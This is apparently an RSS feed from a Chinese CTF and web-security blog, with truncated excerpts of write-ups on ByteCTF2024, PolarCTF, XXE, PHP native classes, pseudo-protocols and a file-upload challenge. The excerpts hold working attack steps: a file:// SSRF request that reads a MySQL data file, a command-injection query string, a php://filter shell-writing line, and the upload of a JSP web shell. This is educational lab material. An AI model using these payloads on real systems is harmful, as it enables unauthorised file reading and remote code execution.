<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>baozongwi's blog</title><link>https://baozongwi.xyz/</link><description>baozongwi's blog</description><lastBuildDate>Thu, 12 Feb 2026 20:59:15 +0800</lastBuildDate><atom:link href="https://baozongwi.xyz/" rel="self" type="application/rss+xml"/><item><title>byteCTF2024</title><link>https://baozongwi.xyz/p/bytectf2024/</link><guid>https://baozongwi.xyz/p/bytectf2024/</guid><pubDate>Sun, 22 Sep 2024 21:15:25 +0000</pubDate><description>0x01 前言 感谢师傅发来的一份WP让我有动手操练的机会
0x02 question OnlyBypassMe 进入之后找到修改头像的部分，利用file协议读取
mysql常用文件后缀
.ibd：InnoDB 表的独立表空间文件。 .frm：表的定义文件。 .MYD 和 .MYI：MyISAM 表的数据和索引文件。 ibdata1：系统表空间文件。 .opt：数据库的选项和配置信息。 .trn 和 .trg：触发器的相关信息。 .isl：InnoDB 表的导入和导出文件。 .sql：SQL 脚本文件。 .err：错误日志文件。 .pid：MySQL 服务器进程的 PID 文件。 .cnf：MySQL 服务器的配置文件。 MySQL常用目录(借用别的师傅总结的)
Variable_name Value basedir /usr binlog_direct_non_transactional_updates OFF character_sets_dir /usr/share/mysql/charsets/ datadir /var/lib/mysql/ ignore_db_dirs innodb_data_home_dir innodb_log_group_home_dir ./ innodb_max_dirty_pages_pct 75 innodb_max_dirty_pages_pct_lwm 0 innodb_undo_directory . lc_messages_dir /usr/share/mysql/ plugin_dir /usr/lib/mysql/plugin/ slave_load_tmpdir /tmp tmpdir /tmp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 POST /api/v1/users/updateAvatarV1 HTTP/1.1 Host: 5bb30c3c.clsadp.com Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Cookie: JSESSIONID=1072184E7D30CC96E0FC1CE1035C26F4 Connection: close Content-Type: application/json Content-Length: 58 { &amp;amp;#34;url&amp;amp;#34;: &amp;amp;#34;file:///var/lib/mysql/byteCTF/flag.ibd#.jpg&amp;amp;#34; } 利用#,伪造后缀jpg读取flag,其实这个在zip协议的时候早就有使用过,当时为了文件能够正常解析zip文件中的恶意文件,使用这个%23来代替#,不然的话是无法正常解析的，来两个例子看看</description><content:encoded>0x01 前言 感谢师傅发来的一份WP让我有动手操练的机会
0x02 question OnlyBypassMe 进入之后找到修改头像的部分，利用file协议读取
mysql常用文件后缀
.ibd：InnoDB 表的独立表空间文件。 .frm：表的定义文件。 .MYD 和 .MYI：MyISAM 表 …</content:encoded></item><item><title>PolarCTF2024秋季</title><link>https://baozongwi.xyz/p/polarctf-2024-autumn/</link><guid>https://baozongwi.xyz/p/polarctf-2024-autumn/</guid><pubDate>Sun, 22 Sep 2024 14:39:35 +0000</pubDate><description>什么php大王</description><content:encoded>0x01 前言 还挺多的
0x02 question EZ_Host 进入之后很明显啊，一个命令注入
1 /?host=127.0.0.1;tac%20f* 序列一下 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 &amp;amp;amp;lt;?php class …</content:encoded></item><item><title>php原生类的利用</title><link>https://baozongwi.xyz/p/php-native-class-exploitation/</link><guid>https://baozongwi.xyz/p/php-native-class-exploitation/</guid><pubDate>Thu, 19 Sep 2024 10:09:04 +0000</pubDate><description>0x01 前言 在base和其他部分赛题中遇到了几道原生类的利用刚好，我在计划中也有此打算进行学习以及利用，那么就来看看吧
0x02 question 了解原生类 PHP 作为一门广泛应用于 Web 开发的脚本语言，它的目标是帮助开发者快速构建功能丰富的应用程序。因此，它提供了大量的原生类和函数，通过这些类的调用，PHP 开发者可以轻松处理文件、数据库、网络请求、加密等多种任务，极大地提升了开发效率。
所以说其实是有很多原生类的，包括算法\压缩\json\xml\图像等等，很多，大家可以自己去深入研究，这里的话只提及我们平时能够进行利用，达到任意文件读取\ssrf等攻击手段的原生类
原生类的利用 反射 ReflectionMethod 利用版本：(PHP 5, PHP 7)
ReflectionMethod 是 PHP 提供的反射类之一，用于获取类中某个具体方法的详细信息。
常见方法
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 # 反射调用方法 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;invoke(new [class?]/NULL(静态类),args1,args2); (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;invokeArgs(new [class?]/NULL(静态类,[args1,args2])); # 设置私有/受保护方法 $f = new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;); $f-&amp;amp;gt;setAccessible(true); $f-&amp;amp;gt;invoke(new [class?]); (new [class?])-&amp;amp;gt;[method?](); // 会报错 # 获取函数信息 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;getDeclaringClass() // 获取反射方法的类作为反射类返回 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;isAbstract() // 方法是否是抽象方法 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;isConstructor() // 方法是否是 __construct (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;isDestructor() // 方法是否是 __destruct (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;isFinal() // 方法是否定义了final (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;isPrivate() // 方法是否是私有方法 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;isProtected() // 方法是否是受保护方法 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;isPublic() // 方法是否是公有方法 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;isStatic() // 方法是否是静态方法 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;getDocComment() // 获取方法注释内容 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;getStartLine() // 获取方法开始行号 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;getEndLine() // 获取方法结束行号 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;getExtensionName() // 获取扩展名称 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;getName() // 获取方法名称 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;getNamespaceName() // 获取命名空间名称 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;getNumberOfParameters() // 获取方法参数数量 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;getNumberOfRequiredParameters() // 获取方法必须传入的参数数量 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;getParameters() // 获取方法参数名 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;getShortName() // 获取方法短名 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;getStaticVariables() // 获取方法静态变量 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;hasReturnType() // 方法是否有特定返回类型 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;inNamespace() // 方法是否定义在命名空间 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;isClosure() // 方法是否是匿名函数 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;isDeprecated() // 方法是否弃用 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;isGenerator() // 方法是否是生成器函数 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;isInternal() // 方法是否是内部函数 (new ReflectionMethod(&amp;amp;#34;class?&amp;amp;#34;,&amp;amp;#34;method?&amp;amp;#34;))-&amp;amp;gt;isUserDefined() // 方法是否是用户定义 [2021 CISCN]easy_source</description><content:encoded>0x01 前言 在base和其他部分赛题中遇到了几道原生类的利用刚好，我在计划中也有此打算进行学习以及利用，那么就来看看吧
0x02 question 了解原生类 PHP 作为一门广泛应用于 Web 开发的脚本语言，它的目标是帮助开发者快速构建功能丰富的应用程序。因此，它提供了大量的原生类和函数，通 …</content:encoded></item><item><title>深入浅出xxe</title><link>https://baozongwi.xyz/p/xxe-in-depth/</link><guid>https://baozongwi.xyz/p/xxe-in-depth/</guid><pubDate>Wed, 18 Sep 2024 11:52:15 +0000</pubDate><description>0x01 前言 前两天看了一下xxe的题目，感觉也可以来补补这个基础知识来，为了这个，还浅浅的了解了一下伪协议
0x02 question xml了解 XML（Extensible Markup Language，可扩展标记语言）是一种用于存储和传输数据的标记语言，它类似于 HTML，但更加灵活，主要用于定义数据，而不是显示数据。XML 的设计目标是数据的可移植性、可读性以及易于扩展。也就是和序列化差不多的特点(但是不能混为一谈哦)
XML 文档的结构通常由三部分组成：XML 声明、**DTD(可选的文档类型定义) **和 **元素(内容部分) **。
写一个xml的demo来分析这三个结构
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 &amp;amp;lt;?xml version=&amp;amp;#34;1.0&amp;amp;#34; encoding=&amp;amp;#34;UTF-8&amp;amp;#34;?&amp;amp;gt; &amp;amp;lt;!DOCTYPE bookstore SYSTEM &amp;amp;#34;bookstore.dtd&amp;amp;#34;&amp;amp;gt; &amp;amp;lt;bookstore&amp;amp;gt; &amp;amp;lt;book category=&amp;amp;#34;fiction&amp;amp;#34;&amp;amp;gt; &amp;amp;lt;title lang=&amp;amp;#34;en&amp;amp;#34;&amp;amp;gt;The Great Gatsby&amp;amp;lt;/title&amp;amp;gt; &amp;amp;lt;author&amp;amp;gt;F. Scott Fitzgerald&amp;amp;lt;/author&amp;amp;gt; &amp;amp;lt;year&amp;amp;gt;1925&amp;amp;lt;/year&amp;amp;gt; &amp;amp;lt;price&amp;amp;gt;10.99&amp;amp;lt;/price&amp;amp;gt; &amp;amp;lt;/book&amp;amp;gt; &amp;amp;lt;book category=&amp;amp;#34;non-fiction&amp;amp;#34;&amp;amp;gt; &amp;amp;lt;title lang=&amp;amp;#34;en&amp;amp;#34;&amp;amp;gt;Sapiens: A Brief History of Humankind&amp;amp;lt;/title&amp;amp;gt; &amp;amp;lt;author&amp;amp;gt;Yuval Noah Harari&amp;amp;lt;/author&amp;amp;gt; &amp;amp;lt;year&amp;amp;gt;2011&amp;amp;lt;/year&amp;amp;gt; &amp;amp;lt;price&amp;amp;gt;14.99&amp;amp;lt;/price&amp;amp;gt; &amp;amp;lt;/book&amp;amp;gt; &amp;amp;lt;/bookstore&amp;amp;gt; xml声明 这个东西就类似于，使用C语言编程的</description><content:encoded>0x01 前言 前两天看了一下xxe的题目，感觉也可以来补补这个基础知识来，为了这个，还浅浅的了解了一下伪协议
0x02 question xml了解 XML（Extensible Markup Language，可扩展标记语言）是一种用于存储和传输数据的标记语言，它类似于 HTML，但更加灵活，主 …</content:encoded></item><item><title>记一次文件上传</title><link>https://baozongwi.xyz/p/file-upload-case-study/</link><guid>https://baozongwi.xyz/p/file-upload-case-study/</guid><pubDate>Tue, 17 Sep 2024 21:36:55 +0000</pubDate><description>0x01 前言 之前一般遇到的文件上传，仅仅考虑header等操作就可以了，但是前几天却遇到了一个与流量包相关联的，那么，让我想起了墨者杯，顺便也来记录一下
0x02 question 这道题目，是和一个师傅交流之后(由于没有电脑)，由那位师傅打通
whereisfilepath 既然是文件上传而且给了流量包，我们先看看流量包，
貌似是没有发现什么,跟踪一下，
1 http.request.method == &amp;amp;#34;POST&amp;amp;#34; 文件上传是POST发包，这个众所周知吧
发现确实是有可疑流量包
跟进TCP流量
很明显看到了确实是进行了文件的上传，红色为发，蓝色为回，之前有道流量题(我还是了解的),但是这个路径如果用url的话怎么弄呢
算了先上传，由流量包找到了可上传路径这里我们打一个哥斯拉jsp进去
可以看到路径是在webapps下面
直接连接就可以了
1 2 3 http://eci-2zedu7d3qqdb8rieq7xc.cloudeci1.ichunqiu.com:8080/202409/shell.jsp password:pass 然后RCE即可拿到flag
0x03 小结 在正常路径下拿不到文件成功上传，看看给的流量包进行追踪或许更有收获</description><content:encoded>0x01 前言 之前一般遇到的文件上传，仅仅考虑header等操作就可以了，但是前几天却遇到了一个与流量包相关联的，那么，让我想起了墨者杯，顺便也来记录一下
0x02 question 这道题目，是和一个师傅交流之后(由于没有电脑)，由那位师傅打通
whereisfilepath 既然是文件上传而且 …</content:encoded></item><item><title>BaseCTF</title><link>https://baozongwi.xyz/p/basectf/</link><guid>https://baozongwi.xyz/p/basectf/</guid><pubDate>Mon, 16 Sep 2024 12:07:24 +0000</pubDate><description>0x01 前言 比赛都结束了，但是我还是写一下WP吧，学到了挺多东西的，只打了前两周，后面开学了自己还要学一些东西，所以就没打了，气人的是，上个月底成都太热了，我写了两周的WP，居然热关机电脑没存上，啊啊啊
0x02 WP [Week1] A Dark Room 查看源码
[Week1] Aura 酱的礼物 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 &amp;amp;lt;?php highlight_file(__FILE__); // Aura 酱，欢迎回家~ // 这里有一份礼物，请你签收一下哟~ $pen = $_POST[&amp;amp;#39;pen&amp;amp;#39;]; if (file_get_contents($pen) !== &amp;amp;#39;Aura&amp;amp;#39;) { die(&amp;amp;#39;这是 Aura 的礼物，你不是 Aura！&amp;amp;#39;); } // 礼物收到啦，接下来要去博客里面写下感想哦~ $challenge = $_POST[&amp;amp;#39;challenge&amp;amp;#39;]; if (strpos($challenge, &amp;amp;#39;http://jasmineaura.github.io&amp;amp;#39;) !== 0) { die(&amp;amp;#39;这不是 Aura 的博客！&amp;amp;#39;); } $blog_content = file_get_contents($challenge); if (strpos($blog_content, &amp;amp;#39;已经收到Kengwang的礼物啦&amp;amp;#39;) === false) { die(&amp;amp;#39;请去博客里面写下感想哦~&amp;amp;#39;); } // 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~ $gift = $_POST[&amp;amp;#39;gift&amp;amp;#39;]; include($gift); 这是 Aura 的礼物，你不是 Aura！ @重定向一下即可</description><content:encoded>0x01 前言 比赛都结束了，但是我还是写一下WP吧，学到了挺多东西的，只打了前两周，后面开学了自己还要学一些东西，所以就没打了，气人的是，上个月底成都太热了，我写了两周的WP，居然热关机电脑没存上，啊啊啊
0x02 WP [Week1] A Dark Room 查看源码
[Week1] Aura …</content:encoded></item><item><title>php伪协议</title><link>https://baozongwi.xyz/p/php-pseudo-protocols/</link><guid>https://baozongwi.xyz/p/php-pseudo-protocols/</guid><pubDate>Mon, 16 Sep 2024 09:31:51 +0000</pubDate><description>0x01 前言 本来是想看看xxe的，但是发现其中使用协议非常的频繁，刚好我协议也没有总结过，那么来弄完这个弄xxe
0x02 question 概念 数据流 PHP伪协议是一种用于处理各种文件流和资源的机制。通过伪协议，PHP可以访问各种数据源（不仅限于文件），并执行特定任务。这些伪协议常用于文件系统操作、数据流处理以及与网络和数据库的交互。
那么既然提到了是数据流，让我想起来之前有一位师傅问我的问题
1 2 &amp;amp;lt;?php file_put_contents(&amp;amp;#39;php://filter/w=convert.base64-decode/resource=shell.php&amp;amp;#39;,&amp;amp;#39;eHl6&amp;amp;#39;); 这里我们可以利用伪协议来代替文件，进行写入恶意代码，但是为什么呢
数据流的抽象：PHP 的文件处理函数（如 fopen、file_get_contents 等）能够操作的数据并不局限于硬盘上的文件，它们可以操作任意数据流。伪协议让这些函数通过统一的接口来处理各种数据源，比如网络数据、内存数据、压缩数据等等。也就是说我们的伪协议其实并不是文件，只不过在抽象的机制下，可以达到文件的效果，所以细心的师傅发现我们使用伪协议的路径并不是像物理文件一样使用绝对路径
伪协议 1 2 3 4 5 6 7 8 9 10 11 12 file:// — 访问本地文件系统 http:// — 访问 HTTP(s) 网址 ftp:// — 访问 FTP(s) URLs php:// — 访问各个输入/输出流（I/O streams） zlib:// — 压缩流 data:// — 数据（RFC 2397） glob:// — 查找匹配的文件路径模式 phar:// — PHP 归档 ssh2:// — Secure Shell 2 rar:// — RAR ogg:// — 音频流 expect:// — 处理交互式的流 php.ini 在php.ini里有两个重要的参数allow_url_fopen、allow_url_include。
allow_url_fopen:默认值是ON。允许url里的封装协议访问文件； allow_url_include:默认值是OFF。不允许包含url里的封装协议包含文件； test demo.php
1 2 &amp;amp;lt;?php file_get_contents($_GET[&amp;amp;#39;a&amp;amp;#39;]); 写好Demo之后我们挨个把常用的测试一下
php://filter 这个协议应该是最常用的</description><content:encoded>0x01 前言 本来是想看看xxe的，但是发现其中使用协议非常的频繁，刚好我协议也没有总结过，那么来弄完这个弄xxe
0x02 question 概念 数据流 PHP伪协议是一种用于处理各种文件流和资源的机制。通过伪协议，PHP可以访问各种数据源（不仅限于文件），并执行特定任务。这些伪协议常用于文件 …</content:encoded></item><item><title>NCTF2019</title><link>https://baozongwi.xyz/p/nctf2019/</link><guid>https://baozongwi.xyz/p/nctf2019/</guid><pubDate>Sun, 15 Sep 2024 15:45:17 +0000</pubDate><description>刷</description><content:encoded>[NCTF2019]Fake XML cookbook 登录的时候抓包一看这不就是xxe嘛
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Request: POST /doLogin.php HTTP/1.1 Host: …</content:encoded></item></channel></rss>